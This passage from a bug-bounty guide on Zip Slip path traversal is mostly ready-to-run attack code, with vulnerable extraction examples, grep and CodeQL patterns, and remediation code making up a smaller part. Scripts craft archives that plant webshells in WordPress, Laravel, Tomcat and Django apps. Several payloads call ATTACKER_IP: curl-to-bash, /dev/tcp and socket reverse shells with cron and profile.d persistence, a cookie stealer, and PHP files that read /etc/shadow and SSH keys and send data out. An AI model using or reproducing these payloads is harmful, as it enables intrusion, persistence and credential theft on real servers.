# ── Burp Suite workflow for Zip Slip testing ──

# 1. Install extensions:
#    - Upload Scanner (by PortSwigger)
#    - Backslash Powered Scanner
#    - Active Scan++
#    - Collaborator Everywhere

# 2. Capture normal archive upload request in Proxy

# 3. Send to Repeater — test manually:
#    a. Replace uploaded ZIP with crafted Zip Slip payload
#    b. Observe response for extraction indicators
#    c. Check Collaborator for OOB callbacks

# 4. Intruder attack on traversal depth:
#    Position: filename inside ZIP (requires custom extension or manual binary edit)
#    Payload: ../  repeated 1-15 times

# 5. Compare responses:
#    - Different response length may indicate file was written
#    - Error messages may reveal extraction path
#    - Timing differences may indicate disk write

# 6. Verify with Collaborator:
#    - Craft ZIP with PHP/JSP that calls Collaborator URL
#    - If Collaborator receives callback = confirmed RCE

# Manual Burp Collaborator verification payload:
python3 -c "
import zipfile
with zipfile.ZipFile('burp_verify.zip','w') as z:
    z.writestr('../../../var/www/html/bcheck.php',
    '<?php file_get_contents(\"http://YOUR_COLLAB_ID.oastify.com/zipslip\"); ?>')
    z.writestr('../../../opt/tomcat/webapps/ROOT/bcheck.jsp',
    '<% new java.net.URL(\"http://YOUR_COLLAB_ID.oastify.com/zipslip\").openStream(); %>')
"
```
::

---

## Language-Specific Vulnerable Patterns

::caution
Understanding the vulnerable code pattern helps identify targets during source code review and gray-box testing.
::

### Vulnerable Code Examples

::code-tree{default-value="python_vuln.py"}
```python [python_vuln.py]
# VULNERABLE — Python zipfile.extractall()
import zipfile

def handle_upload(uploaded_file):
    extract_dir = "/app/uploads/extracted"
    
    # VULNERABLE: extractall trusts filenames in archive
    with zipfile.ZipFile(uploaded_file, 'r') as zf:
        zf.extractall(extract_dir)
    
    return "Files extracted successfully"


# VULNERABLE — Python tarfile.extractall()
import tarfile

def handle_tar_upload(uploaded_file):
    extract_dir = "/app/uploads/extracted"
    
    # VULNERABLE: extractall follows symlinks and traversal paths
    with tarfile.open(uploaded_file, 'r:gz') as tf:
        tf.extractall(extract_dir)
    
    return "Archive extracted"
```

```java [Java_Vuln.java]
// VULNERABLE — Java ZipInputStream without path validation
import java.util.zip.*;
import java.io.*;

public class FileUploadHandler {
    public void extractZip(InputStream zipStream, String destDir) throws IOException {
        ZipInputStream zis = new ZipInputStream(zipStream);
        ZipEntry entry;
        
        while ((entry = zis.getNextEntry()) != null) {
            // VULNERABLE: directly using entry.getName() without validation
            File newFile = new File(destDir, entry.getName());
            
            // Creates parent directories including traversal paths
            new File(newFile.getParent()).mkdirs();
            
            FileOutputStream fos = new FileOutputStream(newFile);
            byte[] buffer = new byte[1024];
            int len;
            while ((len = zis.read(buffer)) > 0) {
                fos.write(buffer, 0, len);
            }
            fos.close();
        }
        zis.close();
    }
}
```

```javascript [nodejs_vuln.js]
// VULNERABLE — Node.js adm-zip
const AdmZip = require('adm-zip');
const path = require('path');

app.post('/upload', (req, res) => {
    const zip = new AdmZip(req.file.buffer);
    const extractDir = './uploads/extracted';
    
    // VULNERABLE: extractAllTo doesn't validate paths
    zip.extractAllTo(extractDir, true);
    
    res.json({ status: 'extracted' });
});


// VULNERABLE — Node.js unzipper
const unzipper = require('unzipper');
const fs = require('fs');

app.post('/upload', (req, res) => {
    fs.createReadStream(req.file.path)
        .pipe(unzipper.Extract({ path: './uploads' }))  // VULNERABLE
        .on('close', () => res.json({ status: 'ok' }));
});
```

```php [php_vuln.php]
<?php
// VULNERABLE — PHP ZipArchive::extractTo
function handleUpload($zipPath) {
    $zip = new ZipArchive;
    $extractDir = '/var/www/html/uploads/extracted';
    
    if ($zip->open($zipPath) === TRUE) {
        // VULNERABLE: extractTo doesn't validate entry paths
        $zip->extractTo($extractDir);
        $zip->close();
        echo 'Files extracted successfully';
    }
}

// VULNERABLE — PHP PclZip
require_once('pclzip.lib.php');

function handlePclZipUpload($zipPath) {
    $archive = new PclZip($zipPath);
    
    // VULNERABLE: extract without PCLZIP_OPT_SET_CHMOD or path filtering
    $result = $archive->extract(PCLZIP_OPT_PATH, '/var/www/html/uploads/');
}
?>
```

```ruby [ruby_vuln.rb]
# VULNERABLE — Ruby rubyzip
require 'zip'

def extract_zip(zip_path, dest_dir)
  Zip::File.open(zip_path) do |zip_file|
    zip_file.each do |entry|
      # VULNERABLE: no path validation
      dest_path = File.join(dest_dir, entry.name)
      FileUtils.mkdir_p(File.dirname(dest_path))
      entry.extract(dest_path)
    end
  end
end
```

```go [go_vuln.go]
// VULNERABLE — Go archive/zip
package main

import (
    "archive/zip"
    "io"
    "os"
    "path/filepath"
)

func extractZip(zipPath, destDir string) error {
    r, _ := zip.OpenReader(zipPath)
    defer r.Close()

    for _, f := range r.File {
        // VULNERABLE: filepath.Join doesn't prevent traversal with ../
        fpath := filepath.Join(destDir, f.Name)
        
        os.MkdirAll(filepath.Dir(fpath), os.ModePerm)
        
        outFile, _ := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
        rc, _ := f.Open()
        io.Copy(outFile, rc)
        
        outFile.Close()
        rc.Close()
    }
    return nil
}
```

```csharp [CSharp_Vuln.cs]
// VULNERABLE — C# System.IO.Compression
using System.IO.Compression;

public class FileUploadController {
    public void ExtractUpload(string zipPath, string extractDir) {
        // VULNERABLE: ExtractToDirectory doesn't validate paths
        ZipFile.ExtractToDirectory(zipPath, extractDir);
    }
    
    // Also vulnerable manual extraction:
    public void ManualExtract(string zipPath, string extractDir) {
        using (ZipArchive archive = ZipFile.OpenRead(zipPath)) {
            foreach (ZipArchiveEntry entry in archive.Entries) {
                // VULNERABLE: using entry.FullName directly
                string destPath = Path.Combine(extractDir, entry.FullName);
                Directory.CreateDirectory(Path.GetDirectoryName(destPath));
                entry.ExtractToFile(destPath, true);
            }
        }
    }
}
```
::

### Source Code Review Patterns

::code-group
```bash [Grep Patterns]
# ── Search for vulnerable archive extraction in source code ──

# Python
grep -rn "extractall\|extract(" --include="*.py" .
grep -rn "zipfile\|tarfile\|shutil.unpack_archive" --include="*.py" .
grep -rn "ZipFile\|TarFile" --include="*.py" .

# Java
grep -rn "ZipInputStream\|ZipEntry\|ZipFile\|JarFile\|JarEntry" --include="*.java" .
grep -rn "entry.getName()\|getName()" --include="*.java" . | grep -i zip
grep -rn "extractAll\|unzip\|decompress" --include="*.java" .

# JavaScript / Node.js
grep -rn "adm-zip\|unzipper\|yauzl\|decompress\|extract" --include="*.js" .
grep -rn "extractAllTo\|Extract\|pipe.*extract" --include="*.js" .
grep -rn "tar\.\|tar-stream\|gunzip" --include="*.js" .

# PHP
grep -rn "ZipArchive\|extractTo\|PclZip\|zip_open\|zip_read" --include="*.php" .
grep -rn "gzopen\|gzread\|tar\|phar" --include="*.php" .

# Ruby
grep -rn "Zip::File\|rubyzip\|Archive::Zip\|extract" --include="*.rb" .

# Go
grep -rn "archive/zip\|archive/tar\|zip.OpenReader" --include="*.go" .
grep -rn "filepath.Join.*Name\|f.Name" --include="*.go" .

# C# / .NET
grep -rn "ZipFile\|ZipArchive\|ExtractToDirectory\|ExtractToFile" --include="*.cs" .
grep -rn "entry.FullName\|entry.Name" --include="*.cs" .

# Generic (all languages)
grep -rn "extract\|unzip\|decompress\|untar\|unpack\|inflate" \
  --include="*.py" --include="*.java" --include="*.js" --include="*.php" \
  --include="*.rb" --include="*.go" --include="*.cs" .

# Semgrep rules for Zip Slip
semgrep --config "p/zip-slip" .
semgrep --config "r/python.zipfile.security" .
semgrep --config "r/java.zipslip" .
```

```bash [CodeQL Queries]
# ── CodeQL for Zip Slip detection ──

# Clone CodeQL queries
git clone https://github.com/github/codeql.git
cd codeql

# Java Zip Slip query
codeql database analyze java-db \
  java/ql/src/Security/CWE/CWE-022/ZipSlip.ql \
  --format=sarif-latest --output=results.sarif

# Python archive extraction
codeql database analyze python-db \
  python/ql/src/Security/CWE-022/ \
  --format=sarif-latest --output=results.sarif

# Custom query example for Java:
cat > zipslip_custom.ql << 'EOF'
/**
 * @name Zip Slip vulnerability
 * @kind path-problem
 * @problem.severity error
 * @id custom/zip-slip
 */
import java
import semmle.code.java.security.ZipSlipQuery

from ZipSlipFlow::PathNode source, ZipSlipFlow::PathNode sink
where ZipSlipFlow::flowPath(source, sink)
select sink.getNode(), source, sink, "Potential Zip Slip from $@.", source.getNode(), "archive entry"
EOF

codeql database analyze java-db zipslip_custom.ql \
  --format=sarif-latest --output=zipslip_results.sarif
```
::

---

## Target-Specific Exploitation

### Web Framework Targets

::tabs
  :::tabs-item{icon="i-lucide-server" label="WordPress"}
  ```bash
  # ── WordPress Zip Slip vectors ──

  # Theme upload (requires admin)
  python3 -c "
  import zipfile
  with zipfile.ZipFile('wp_theme_evil.zip','w') as z:
      # Legitimate theme structure
      z.writestr('evil-theme/style.css', '''/*
  Theme Name: Evil Theme
  Theme URI: http://example.com
  Description: Malicious theme
  Version: 1.0
  */''')
      z.writestr('evil-theme/index.php', '<?php // Silence ?>')
      # Zip Slip payload
      z.writestr('../../../wp-content/shell.php', 
          '<?php system(\$_GET[\"cmd\"]); ?>')
      z.writestr('../../../../wp-config.php',
          '<?php system(\$_GET[\"cmd\"]); // ' + 'A'*1000 + ' ?>')
  "

  curl -X POST https://target.com/wp-admin/themes.php \
    -F "themezip=@wp_theme_evil.zip" \
    -F "_wpnonce=NONCE_VALUE" \
    -H "Cookie: wordpress_logged_in_xxx=COOKIE"

  # Plugin upload (requires admin)
  python3 -c "
  import zipfile
  with zipfile.ZipFile('wp_plugin_evil.zip','w') as z:
      z.writestr('evil-plugin/evil-plugin.php', '''<?php
  /*
  Plugin Name: Evil Plugin
  Description: Definitely not malicious
  Version: 1.0
  */
  ?>')
      z.writestr('../../../shell.php',
          '<?php echo shell_exec(\$_GET[\"cmd\"]); ?>')
  "

  # Media upload with ZIP (if enabled)
  curl -X POST https://target.com/wp-admin/async-upload.php \
    -F "async-upload=@wp_theme_evil.zip" \
    -F "name=theme.zip" \
    -F "_wpnonce=NONCE"

  # Verify
  curl -s "https://target.com/wp-content/shell.php?cmd=id"
  curl -s "https://target.com/shell.php?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Laravel / Symfony"}
  ```bash
  # ── Laravel / Symfony targets ──

  # Common upload endpoints
  curl -X POST https://target.com/api/import \
    -F "file=@evil.zip" \
    -H "X-CSRF-TOKEN: TOKEN" \
    -H "Cookie: laravel_session=SESSION"

  # Target paths for Laravel
  python3 -c "
  import zipfile
  with zipfile.ZipFile('laravel_evil.zip','w') as z:
      # Webshell in public directory
      z.writestr('../../../public/cmd.php',
          '<?php system(\$_REQUEST[\"cmd\"]); ?>')
      
      # .env overwrite
      z.writestr('../../../.env', '''
  APP_KEY=base64:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
  APP_DEBUG=true
  DB_HOST=ATTACKER_IP
  DB_DATABASE=laravel
  REDIS_HOST=ATTACKER_IP
  ''')
      
      # Routes file injection (if writable)
      z.writestr('../../../routes/web.php', '''<?php
  use Illuminate\Support\Facades\Route;
  Route::get(\"/rce\", function() {
      return response(shell_exec(request(\"cmd\")));
  });
  ?>')
      
      # Blade template SSTI
      z.writestr('../../../resources/views/welcome.blade.php',
          '{{ system(\$_GET[\"cmd\"]) }}')
      
      # Storage symlink abuse
      z.writestr('../../../storage/app/public/shell.php',
          '<?php system(\$_GET[\"cmd\"]); ?>')
  "

  # Verify
  curl "https://target.com/cmd.php?cmd=id"
  curl "https://target.com/rce?cmd=id"
  curl "https://target.com/storage/shell.php?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Spring Boot / Tomcat"}
  ```bash
  # ── Java / Spring Boot / Tomcat targets ──

  python3 -c "
  import zipfile
  
  jsp_shell = '''<%@ page import=\"java.util.*,java.io.*\"%>
  <%
  String cmd = request.getParameter(\"cmd\");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",cmd});
      Scanner s = new Scanner(p.getInputStream()).useDelimiter(\"\\\\\\\\A\");
      out.println(\"<pre>\" + (s.hasNext() ? s.next() : \"\") + \"</pre>\");
  }
  %>'''
  
  with zipfile.ZipFile('java_evil.zip','w') as z:
      # Tomcat webapps ROOT
      z.writestr('../../../opt/tomcat/webapps/ROOT/cmd.jsp', jsp_shell)
      z.writestr('../../../../usr/local/tomcat/webapps/ROOT/cmd.jsp', jsp_shell)
      z.writestr('../../../../var/lib/tomcat9/webapps/ROOT/cmd.jsp', jsp_shell)
      
      # Tomcat manager credentials
      z.writestr('../../../opt/tomcat/conf/tomcat-users.xml', '''<?xml version=\"1.0\"?>
  <tomcat-users>
    <role rolename=\"manager-gui\"/>
    <role rolename=\"manager-script\"/>
    <user username=\"hacker\" password=\"hacker123\" roles=\"manager-gui,manager-script\"/>
  </tomcat-users>''')
      
      # Spring Boot application.properties
      z.writestr('../../../app/src/main/resources/application.properties',
          'spring.datasource.url=jdbc:mysql://ATTACKER_IP:3306/exfil\n'
          'spring.datasource.username=root\n'
          'spring.datasource.password=\n'
          'server.address=0.0.0.0\n'
          'management.endpoints.web.exposure.include=*\n')
      
      # WAR deployment (auto-deploy)
      # Create minimal WAR with shell
      z.writestr('../../../opt/tomcat/webapps/pwned.war', open('shell.war','rb').read() 
          if os.path.exists('shell.war') else b'')
  "

  # Verify
  curl "https://target.com/cmd.jsp?cmd=id"
  curl "https://target.com:8080/cmd.jsp?cmd=id"
  curl "https://target.com:8080/manager/html" -u "hacker:hacker123"
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Django / Flask"}
  ```bash
  # ── Python framework targets ──

  python3 -c "
  import zipfile
  
  with zipfile.ZipFile('python_evil.zip','w') as z:
      # Flask/Django static directory
      z.writestr('../../../app/static/shell.html',
          '<script>fetch(\"http://ATTACKER/steal?\"+document.cookie)</script>')
      
      # Django settings overwrite
      z.writestr('../../../app/myproject/settings.py', '''
  import os
  SECRET_KEY = \"attacker-controlled-key-for-pickle-deserialization\"
  DEBUG = True
  ALLOWED_HOSTS = [\"*\"]
  DATABASES = {
      \"default\": {
          \"ENGINE\": \"django.db.backends.postgresql\",
          \"HOST\": \"ATTACKER_IP\",
          \"PORT\": \"5432\",
          \"NAME\": \"exfil\",
          \"USER\": \"postgres\",
          \"PASSWORD\": \"\",
      }
  }
  CACHES = {
      \"default\": {
          \"BACKEND\": \"django.core.cache.backends.memcached.PyMemcacheCache\",
          \"LOCATION\": \"ATTACKER_IP:11211\",
      }
  }
  ''')
      
      # Flask template injection
      z.writestr('../../../app/templates/index.html',
          '{{ config.__class__.__init__.__globals__[\"os\"].popen(request.args.get(\"cmd\",\"id\")).read() }}')
      
      # Jinja2 template with SSTI
      z.writestr('../../../app/templates/base.html',
          '{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").popen(request.args.cmd).read()}}{% endif %}{% endfor %}')
      
      # Python startup file
      z.writestr('../../../app/__init__.py',
          'import os; os.system(\"curl http://ATTACKER_IP/shell.sh | bash\")')
      
      # WSGI config
      z.writestr('../../../app/wsgi.py', '''
  import os
  os.system(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &\")
  from django.core.wsgi import get_wsgi_application
  os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'myproject.settings')
  application = get_wsgi_application()
  ''')
  "
  ```
  :::
::

---

## Post-Exploitation via Zip Slip

::note
Once you've confirmed file write capability, maximize impact for your bug bounty report with these post-exploitation techniques.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shell Payloads"}
  ```bash
  # ── Craft ZIPs with various reverse shell payloads ──

  ATTACKER_IP="10.10.14.1"
  PORT="4444"

  # PHP reverse shell
  python3 -c "
  import zipfile
  with zipfile.ZipFile('revshell_php.zip','w') as z:
      z.writestr('../../../var/www/html/rs.php', '''<?php
  \$sock=fsockopen(\"${ATTACKER_IP}\",${PORT});
  \$proc=proc_open(\"/bin/bash\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);
  ?>''')
  "

  # JSP reverse shell
  python3 -c "
  import zipfile
  with zipfile.ZipFile('revshell_jsp.zip','w') as z:
      z.writestr('../../../opt/tomcat/webapps/ROOT/rs.jsp', '''
  <%@page import=\"java.lang.*\"%>
  <%@page import=\"java.util.*\"%>
  <%@page import=\"java.io.*\"%>
  <%@page import=\"java.net.*\"%>
  <%
  class StreamConnector extends Thread {
      InputStream is; OutputStream os;
      StreamConnector(InputStream is, OutputStream os) { this.is=is; this.os=os; }
      public void run() {
          BufferedReader in = null;
          BufferedWriter out = null;
          try { in=new BufferedReader(new InputStreamReader(this.is));
              out=new BufferedWriter(new OutputStreamWriter(this.os));
              char buffer[]=new char[8192]; int length;
              while((length=in.read(buffer,0,buffer.length))>0) {
                  out.write(buffer,0,length); out.flush(); }
          } catch(Exception e) {} try { if(in!=null) in.close();
              if(out!=null) out.close(); } catch(Exception e) {} }
  }
  try {
      Socket socket=new Socket(\"${ATTACKER_IP}\",${PORT});
      Process process=Runtime.getRuntime().exec(\"/bin/bash\");
      new StreamConnector(process.getInputStream(),socket.getOutputStream()).start();
      new StreamConnector(socket.getInputStream(),process.getOutputStream()).start();
  } catch(Exception e) {}
  %>''')
  "

  # Bash via cron
  python3 -c "
  import zipfile
  with zipfile.ZipFile('revshell_cron.zip','w') as z:
      z.writestr('../../../etc/cron.d/revshell',
          '* * * * * root bash -c \"bash -i >& /dev/tcp/${ATTACKER_IP}/${PORT} 0>&1\"\n')
  "

  # Python reverse shell via profile.d
  python3 -c "
  import zipfile
  with zipfile.ZipFile('revshell_profiled.zip','w') as z:
      z.writestr('../../../etc/profile.d/update.sh', '''#!/bin/bash
  python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('${ATTACKER_IP}',${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\" &
  ''')
  "

  # Start listener
  echo "[*] Start listener: nc -lvnp ${PORT}"
  ```
  :::

  :::tabs-item{icon="i-lucide-flag" label="Data Exfiltration"}
  ```bash
  # ── Exfiltrate sensitive data via Zip Slip written scripts ──

  # PHP data exfiltrator
  python3 -c "
  import zipfile
  with zipfile.ZipFile('exfil.zip','w') as z:
      z.writestr('../../../var/www/html/exfil.php', '''<?php
  header(\"Content-Type: text/plain\");
  \$files = array(
      \"/etc/passwd\",
      \"/etc/shadow\",
      \"/app/.env\",
      \"/var/www/html/wp-config.php\",
      \"/app/config/database.yml\",
      \"/root/.bash_history\",
      \"/root/.ssh/id_rsa\",
      \"/proc/self/environ\"
  );
  foreach(\$files as \$f) {
      if(file_exists(\$f)) {
          echo \"=== \$f ===\\n\";
          echo file_get_contents(\$f);
          echo \"\\n\\n\";
      }
  }
  ?>''')
  "

  # After upload, exfiltrate:
  curl -s "https://target.com/exfil.php" -o exfiltrated_data.txt

  # Automated exfil with OOB
  python3 -c "
  import zipfile
  with zipfile.ZipFile('oob_exfil.zip','w') as z:
      z.writestr('../../../var/www/html/oob.php', '''<?php
  \$data = base64_encode(file_get_contents(\"/etc/passwd\"));
  file_get_contents(\"http://ATTACKER_IP:8080/exfil?data=\" . urlencode(\$data));
  echo \"ok\";
  ?>''')
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Impact Demonstration"}
  ```bash
  # ── For bug bounty reports — demonstrate impact safely ──

  # Write a harmless proof file (NOT a shell)
  python3 -c "
  import zipfile
  import time
  timestamp = str(int(time.time()))
  with zipfile.ZipFile('poc_safe.zip','w') as z:
      z.writestr('data.csv', 'id,name\n1,test')
      z.writestr('../../../var/www/html/zipslip_poc_' + timestamp + '.txt',
          'Zip Slip PoC - File written outside upload directory\\n'
          'Timestamp: ' + timestamp + '\\n'
          'This file demonstrates arbitrary file write via path traversal\\n'
          'in archive extraction. No malicious code was executed.\\n'
          'Bug Hunter: YOUR_HANDLE\\n')
  "

  # Upload and verify
  curl -X POST https://target.com/api/upload \
    -F "file=@poc_safe.zip" \
    -H "Cookie: session=TOKEN"

  # Verify file was written
  curl -s "https://target.com/zipslip_poc_TIMESTAMP.txt"

  # Screenshot the response for your report
  ```
  :::
::

---

## Reporting Guidelines

::card-group
  :::card
  ---
  icon: i-lucide-file-text
  title: Report Title
  ---
  `Arbitrary File Write via Zip Slip Path Traversal in [Endpoint Name]`
  :::

  :::card
  ---
  icon: i-lucide-alert-triangle
  title: Severity Rating
  ---
  **Critical (CVSS 9.0-10.0)** if RCE is achievable

  **High (CVSS 7.0-8.9)** if limited to config overwrite or file read

  **Medium (CVSS 4.0-6.9)** if write location is restricted
  :::

  :::card
  ---
  icon: i-lucide-list-checks
  title: Report Structure
  ---
  1. Summary of the vulnerability
  2. Affected endpoint and parameters
  3. Step-by-step reproduction
  4. Malicious archive creation script
  5. Upload request (cURL or Burp)
  6. Verification of file write
  7. Impact analysis (RCE / data access)
  8. Remediation recommendations
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Remediation Advice
  ---
  - Validate resolved path starts with intended extraction directory
  - Use `canonical path` comparison after joining paths
  - Reject entries containing `..` or absolute paths
  - Reject symlinks and hardlinks in archives
  - Use sandboxed extraction directories
  - Apply least-privilege file permissions
  - Use patched library versions
  :::
::

### Safe Remediation Code

::code-collapse
```python [safe_extraction.py]
#!/usr/bin/env python3
"""Safe archive extraction — prevents Zip Slip"""
import zipfile
import tarfile
import os

def safe_extract_zip(zip_path, extract_dir):
    """Safely extract ZIP with path validation"""
    extract_dir = os.path.realpath(extract_dir)
    
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for info in zf.infolist():
            # Resolve the full destination path
            dest_path = os.path.realpath(
                os.path.join(extract_dir, info.filename)
            )
            
            # Ensure destination is within extract directory
            if not dest_path.startswith(extract_dir + os.sep) and dest_path != extract_dir:
                raise ValueError(
                    f"Zip Slip detected: {info.filename} resolves to {dest_path}"
                )
            
            # Reject entries with suspicious patterns
            if '..' in info.filename or info.filename.startswith('/'):
                raise ValueError(
                    f"Suspicious path in archive: {info.filename}"
                )
            
            zf.extract(info, extract_dir)
    
    print(f"[+] Safely extracted to {extract_dir}")

def safe_extract_tar(tar_path, extract_dir):
    """Safely extract TAR with path and symlink validation"""
    extract_dir = os.path.realpath(extract_dir)
    
    with tarfile.open(tar_path, 'r:*') as tf:
        for member in tf.getmembers():
            # Reject symlinks and hardlinks
            if member.issym() or member.islnk():
                raise ValueError(
                    f"Symlink/hardlink rejected: {member.name} -> {member.linkname}"
                )
            
            # Resolve destination
            dest_path = os.path.realpath(
                os.path.join(extract_dir, member.name)
            )
            
            # Validate path
            if not dest_path.startswith(extract_dir + os.sep) and dest_path != extract_dir:
                raise ValueError(
                    f"Path traversal detected: {member.name} resolves to {dest_path}"
                )
            
            if '..' in member.name or member.name.startswith('/'):
                raise ValueError(
                    f"Suspicious path: {member.name}"
                )
            
            tf.extract(member, extract_dir)
    
    print(f"[+] Safely extracted to {extract_dir}")

# Python 3.12+ has data_filter for tarfile
# import tarfile
# with tarfile.open('archive.tar.gz') as tf:
#     tf.extractall(path=dest, filter='data')  # Safe by default
```
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="Create ZIP with traversal" type="command"}
  `python3 -c "import zipfile; zipfile.ZipFile('e.zip','w').writestr('../../../var/www/html/s.php','<?php system(\$_GET[c]); ?>')"`
  :::

  :::field{name="Create TAR with traversal" type="command"}
  `python3 -c "import tarfile,io; t=tarfile.open('e.tar.gz','w:gz'); i=tarfile.TarInfo('../../../var/www/html/s.php'); d=b'<?php system(\$_GET[c]); ?>'; i.size=len(d); t.addfile(i,io.BytesIO(d))"`
  :::

  :::field{name="Create symlink TAR" type="command"}
  `ln -s /etc/passwd link && tar czf sym.tar.gz link && rm link`
  :::

  :::field{name="Upload via cURL" type="command"}
  `curl -X POST https://target/upload -F "file=@evil.zip" -H "Cookie: session=TOKEN"`
  :::

  :::field{name="Verify shell" type="command"}
  `curl -s "https://target/shell.php?cmd=id"`
  :::

  :::field{name="List ZIP contents" type="command"}
  `python3 -c "import zipfile; [print(f.filename) for f in zipfile.ZipFile('e.zip').infolist()]"`
  :::

  :::field{name="List TAR contents" type="command"}
  `python3 -c "import tarfile; [print(m.name, '->', m.linkname if m.issym() else '') for m in tarfile.open('e.tar.gz')]"`
  :::

  :::field{name="evilarc crafting" type="command"}
  `python2 evilarc.py shell.php -o unix -p "var/www/html" -d 5 -f evil.zip`
  :::

  :::field{name="Grep for vulnerable code" type="command"}
  `grep -rn "extractall\|extractTo\|ZipInputStream\|adm-zip" --include="*.py" --include="*.java" --include="*.js" --include="*.php" .`
  :::

  :::field{name="Start listener" type="command"}
  `nc -lvnp 4444`
  :::
::

---

## References & Resources

- [Snyk Zip Slip Vulnerability Research](https://security.snyk.io/research/zip-slip-vulnerability)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [HackerOne Disclosed Reports — Zip Slip](https://hackerone.com/hacktivity?querystring=zip%20slip)
- [evilarc — GitHub](https://github.com/ptoomey3/evilarc)
- [Zip Slip Affected Libraries List](https://github.com/snyk/zip-slip-vulnerability#affected-libraries)